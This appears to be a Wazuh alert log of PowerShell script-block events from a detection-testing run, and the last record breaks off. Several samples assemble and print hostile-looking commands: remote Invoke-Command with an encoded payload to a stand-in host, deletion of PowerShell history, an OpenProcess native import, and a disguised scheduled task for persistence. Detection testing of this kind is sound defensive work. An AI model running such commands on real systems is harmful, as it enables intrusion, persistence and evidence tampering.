{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"5a236cb3-1f8d-45e9-9c3c-509db340a32c","scriptBlockText":"$sampleId='PST-036'; [xml]'&lt;config&gt;&lt;mode&gt;audit&lt;/mode&gt;&lt;/config&gt;' | Select-Object -ExpandProperty config; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721632","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-036'; [xml]'<config><mode>audit</mode></config>' | Select-Object -ExpandProperty config; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 5a236cb3-1f8d-45e9-9c3c-509db340a32c\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:45.8648787Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:45.8648787Z\",\"eventRecordID\":\"721632\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-036'; [xml]'<config><mode>audit</mode></config>' | Select-Object -ExpandProperty config; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 5a236cb3-1f8d-45e9-9c3c-509db340a32c\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-036'; [xml]'&lt;config&gt;&lt;mode&gt;audit&lt;/mode&gt;&lt;/config&gt;' | Select-Object -ExpandProperty config; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"5a236cb3-1f8d-45e9-9c3c-509db340a32c\"}}}","id":"1784280946.405533","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:46.215+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"e66c52bb-4670-4d7a-aaa4-71377fabbb98","scriptBlockText":"$sampleId='PST-037'; 'alpha','gamma','beta' | Sort-Object; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721637","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-037'; 'alpha','gamma','beta' | Sort-Object; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: e66c52bb-4670-4d7a-aaa4-71377fabbb98\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:46.1986760Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:46.1986760Z\",\"eventRecordID\":\"721637\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-037'; 'alpha','gamma','beta' | Sort-Object; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: e66c52bb-4670-4d7a-aaa4-71377fabbb98\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-037'; 'alpha','gamma','beta' | Sort-Object; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"e66c52bb-4670-4d7a-aaa4-71377fabbb98\"}}}","id":"1784280946.405533","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:46.294+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"f42d7fc0-5231-4b4d-aa1a-e967124be132","scriptBlockText":"$sampleId='PST-038'; $parts=@('[Reflectio','n.Assemb','ly]:',':Loa','d([Con','vert]::Fr','omBase','64Stri','ng(''VEhFU0lTL','UlORVJULU','RVTU1Z''))'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721639","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-038'; $parts=@('[Reflectio','n.Assemb','ly]:',':Loa','d([Con','vert]::Fr','omBase','64Stri','ng(''VEhFU0lTL','UlORVJULU','RVTU1Z''))'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: f42d7fc0-5231-4b4d-aa1a-e967124be132\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:46.5242609Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:46.5242609Z\",\"eventRecordID\":\"721639\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-038'; $parts=@('[Reflectio','n.Assemb','ly]:',':Loa','d([Con','vert]::Fr','omBase','64Stri','ng(''VEhFU0lTL','UlORVJULU','RVTU1Z''))'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: f42d7fc0-5231-4b4d-aa1a-e967124be132\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-038'; $parts=@('[Reflectio','n.Assemb','ly]:',':Loa','d([Con','vert]::Fr','omBase','64Stri','ng(''VEhFU0lTL','UlORVJULU','RVTU1Z''))'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"f42d7fc0-5231-4b4d-aa1a-e967124be132\"}}}","id":"1784280947.405533","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:47.332+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"aa06255f-e554-4b7d-ae8b-621ec4c605ab","scriptBlockText":"$sampleId='PST-039'; $parts=@('Invoke-Command -','ComputerName ''host','.example.invali','d'' -ScriptB','lock { power','shell.exe -NoProf','ile -EncodedCo','mmand VwByAGkAd','ABlAC0ATwB1AH','QAcAB1AHQAIAAnAFQASA','BFAFMASQBTAC0AS','QBOAEUAUgBUACcA }'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721641","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-039'; $parts=@('Invoke-Command -','ComputerName ''host','.example.invali','d'' -ScriptB','lock { power','shell.exe -NoProf','ile -EncodedCo','mmand VwByAGkAd','ABlAC0ATwB1AH','QAcAB1AHQAIAAnAFQASA','BFAFMASQBTAC0AS','QBOAEUAUgBUACcA }'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: aa06255f-e554-4b7d-ae8b-621ec4c605ab\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:46.8588207Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:46.8588207Z\",\"eventRecordID\":\"721641\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-039'; $parts=@('Invoke-Command -','ComputerName ''host','.example.invali','d'' -ScriptB','lock { power','shell.exe -NoProf','ile -EncodedCo','mmand VwByAGkAd','ABlAC0ATwB1AH','QAcAB1AHQAIAAnAFQASA','BFAFMASQBTAC0AS','QBOAEUAUgBUACcA }'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: aa06255f-e554-4b7d-ae8b-621ec4c605ab\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-039'; $parts=@('Invoke-Command -','ComputerName ''host','.example.invali','d'' -ScriptB','lock { power','shell.exe -NoProf','ile -EncodedCo','mmand VwByAGkAd','ABlAC0ATwB1AH','QAcAB1AHQAIAAnAFQASA','BFAFMASQBTAC0AS','QBOAEUAUgBUACcA }'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"aa06255f-e554-4b7d-ae8b-621ec4c605ab\"}}}","id":"1784280947.409396","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script used \"Invoke-command\" cmdlet to execute code on remote computer","firedtimes":2,"groups":["windows"," powershell"],"id":"91823","level":14,"mail":true,"mitre":{"id":["T1059.001","T1021.006"],"tactic":["Execution","Lateral Movement"],"technique":["PowerShell","Windows Remote Management"]}},"timestamp":"2026-07-17T11:35:47.336+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"84fb42e5-ed6e-4982-a23b-a48debfa5728","scriptBlockText":"$sampleId='PST-040'; $indicator='Get-Process | Select-Object Name,Id,Path'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721645","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-040'; $indicator='Get-Process | Select-Object Name,Id,Path'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 84fb42e5-ed6e-4982-a23b-a48debfa5728\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:47.1866915Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:47.1866915Z\",\"eventRecordID\":\"721645\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-040'; $indicator='Get-Process | Select-Object Name,Id,Path'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 84fb42e5-ed6e-4982-a23b-a48debfa5728\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-040'; $indicator='Get-Process | Select-Object Name,Id,Path'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"84fb42e5-ed6e-4982-a23b-a48debfa5728\"}}}","id":"1784280947.412533","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell executing process discovery","firedtimes":2,"groups":["windows"," powershell"],"id":"91815","level":4,"mail":false,"mitre":{"id":["T1057"],"tactic":["Discovery"],"technique":["Process Discovery"]}},"timestamp":"2026-07-17T11:35:47.343+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"def90ffa-49ee-4be4-b7d1-31fea05407b9","scriptBlockText":"$sampleId='PST-041'; $indicator='Clear-History; Remove-Item (Get-PSReadLineOption).HistorySavePath -Force'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721648","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-041'; $indicator='Clear-History; Remove-Item (Get-PSReadLineOption).HistorySavePath -Force'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: def90ffa-49ee-4be4-b7d1-31fea05407b9\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:47.5085329Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:47.5085329Z\",\"eventRecordID\":\"721648\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-041'; $indicator='Clear-History; Remove-Item (Get-PSReadLineOption).HistorySavePath -Force'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: def90ffa-49ee-4be4-b7d1-31fea05407b9\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-041'; $indicator='Clear-History; Remove-Item (Get-PSReadLineOption).HistorySavePath -Force'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"def90ffa-49ee-4be4-b7d1-31fea05407b9\"}}}","id":"1784280948.412533","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:48.375+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"a831476d-1b6c-4c75-bda9-375d3a84e6f7","scriptBlockText":"$sampleId='PST-042'; Write-Output $PROFILE; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721661","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-042'; Write-Output $PROFILE; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: a831476d-1b6c-4c75-bda9-375d3a84e6f7\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:47.8399836Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:47.8399836Z\",\"eventRecordID\":\"721661\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-042'; Write-Output $PROFILE; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: a831476d-1b6c-4c75-bda9-375d3a84e6f7\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-042'; Write-Output $PROFILE; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"a831476d-1b6c-4c75-bda9-375d3a84e6f7\"}}}","id":"1784280948.412533","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:48.549+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"ef087561-3749-45ec-9d6d-ac9f4015054f","scriptBlockText":"$sampleId='PST-043'; $parts=@('Add-Type -Memb','erDefinition ''[D','llImport(\\\"kernel','32.dll\\\")] public s','tatic extern',' IntPtr OpenPr','ocess(uint acc','ess, bool inher','it, int process','Id);'' -Name Nativ','eMethods -Namespace',' Thesis.Inert'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721665","keywords":"0x0","level":"3","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-043'; $parts=@('Add-Type -Memb','erDefinition ''[D','llImport(\"kernel','32.dll\")] public s','tatic extern',' IntPtr OpenPr','ocess(uint acc','ess, bool inher','it, int process','Id);'' -Name Nativ','eMethods -Namespace',' Thesis.Inert'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: ef087561-3749-45ec-9d6d-ac9f4015054f\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"WARNING","systemTime":"2026-07-17T09:35:48.1660973Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"3\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:48.1660973Z\",\"eventRecordID\":\"721665\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"WARNING\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-043'; $parts=@('Add-Type -Memb','erDefinition ''[D','llImport(\\\"kernel','32.dll\\\")] public s','tatic extern',' IntPtr OpenPr','ocess(uint acc','ess, bool inher','it, int process','Id);'' -Name Nativ','eMethods -Namespace',' Thesis.Inert'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: ef087561-3749-45ec-9d6d-ac9f4015054f\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-043'; $parts=@('Add-Type -Memb','erDefinition ''[D','llImport(\\\\\\\"kernel','32.dll\\\\\\\")] public s','tatic extern',' IntPtr OpenPr','ocess(uint acc','ess, bool inher','it, int process','Id);'' -Name Nativ','eMethods -Namespace',' Thesis.Inert'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"ef087561-3749-45ec-9d6d-ac9f4015054f\"}}}","id":"1784280948.412533","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:48.610+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"bc69ef68-296d-4a74-9325-4a850b4f96c9","scriptBlockText":"$sampleId='PST-044'; Get-FileHash -InputStream ([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes('benign'))) | Select-Object Algorithm, Hash; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721669","keywords":"0x0","level":"3","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-044'; Get-FileHash -InputStream ([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes('benign'))) | Select-Object Algorithm, Hash; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: bc69ef68-296d-4a74-9325-4a850b4f96c9\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"WARNING","systemTime":"2026-07-17T09:35:48.4930944Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"3\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:48.4930944Z\",\"eventRecordID\":\"721669\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"WARNING\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-044'; Get-FileHash -InputStream ([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes('benign'))) | Select-Object Algorithm, Hash; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: bc69ef68-296d-4a74-9325-4a850b4f96c9\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-044'; Get-FileHash -InputStream ([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes('benign'))) | Select-Object Algorithm, Hash; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"bc69ef68-296d-4a74-9325-4a850b4f96c9\"}}}","id":"1784280949.412533","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:49.415+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"7e3828f8-b9dc-4a43-9f91-8d124bc7d25b","scriptBlockText":"$sampleId='PST-045'; $parts=@('Register-ScheduledTas','k -TaskName ''U','pdateCheck'' -Action',' (New-ScheduledTaskAc','tion -Execute ''pow','ershell.exe'' -Argum','ent ''-NoProfile -Enc','odedCommand VwByAGk','AdABlAC0ATwB1AHQAcA','B1AHQAIAAnAFQASAB','FAFMASQBTAC0ASQBO','AEUAUgBUACcA'')'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721671","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-045'; $parts=@('Register-ScheduledTas','k -TaskName ''U','pdateCheck'' -Action',' (New-ScheduledTaskAc','tion -Execute ''pow','ershell.exe'' -Argum','ent ''-NoProfile -Enc','odedCommand VwByAGk','AdABlAC0ATwB1AHQAcA','B1AHQAIAAnAFQASAB','FAFMASQBTAC0ASQBO','AEUAUgBUACcA'')'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 7e3828f8-b9dc-4a43-9f91-8d124bc7d25b\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:48.8282841Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:48.8282841Z\",\"eventRecordID\":\"721671\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-045'; $parts=@('Register-ScheduledTas','k -TaskName ''U','pdateCheck'' -Action',' (New-ScheduledTaskAc','tion -Execute ''pow','ershell.exe'' -Argum','ent ''-NoProfile -Enc','odedCommand VwByAGk','AdABlAC0ATwB1AHQAcA','B1AHQAIAAnAFQASAB','FAFMASQBTAC0ASQBO','AEUAUgBUACcA'')'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 7e3828f8-b9dc-4a43-9f91-8d124bc7d25b\\r\\nPath: 